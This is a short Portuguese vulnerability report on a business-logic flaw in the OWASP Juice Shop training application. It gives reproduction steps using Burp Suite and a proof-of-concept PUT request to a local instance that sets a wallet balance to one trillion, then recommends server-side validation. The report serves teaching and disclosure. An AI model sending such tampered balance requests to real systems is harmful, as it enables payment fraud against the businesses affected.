# Falha de Lógica de Negócio Resultando em Manipulação do Saldo da Carteira

## Alvo
OWASP Juice Shop

## Severidade
Alta

## Descrição
A aplicação permite que os usuários alterem o saldo de sua carteira digital modificando uma requisição HTTP controlada pelo cliente

## Passos para reproduzir

1. Interceptar a requisição utilizando um proxy como o Burp Suite.
2. Adicionar fundos à carteira normalmente.
3. Enviar a requisição PUT interceptada para o Repeater.
4. Modificar o parâmetro `balance`.
5. Encaminhar a requisição modificada para o navegador.
6. Atualizar a página e observar o saldo atualizado.

## Prova de Conceito (PoC)
PUT /rest/wallet/balance HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json

{
    "balance": 1000000000000,
    "paymentId": 7
}

## Impacto
Permite que atacantes gerem fundos ilimitados, levando ao abuso financeiro, como realizar compras gratuitamente, burlar mecanismos de pagamento ou explorar a vulnerabilidade para ganho monetário.

## Recomendação
Ignore a entrada direta do usuário e valide o saldo estritamente no server-side. Implemente um modelo de transação baseado em ledger
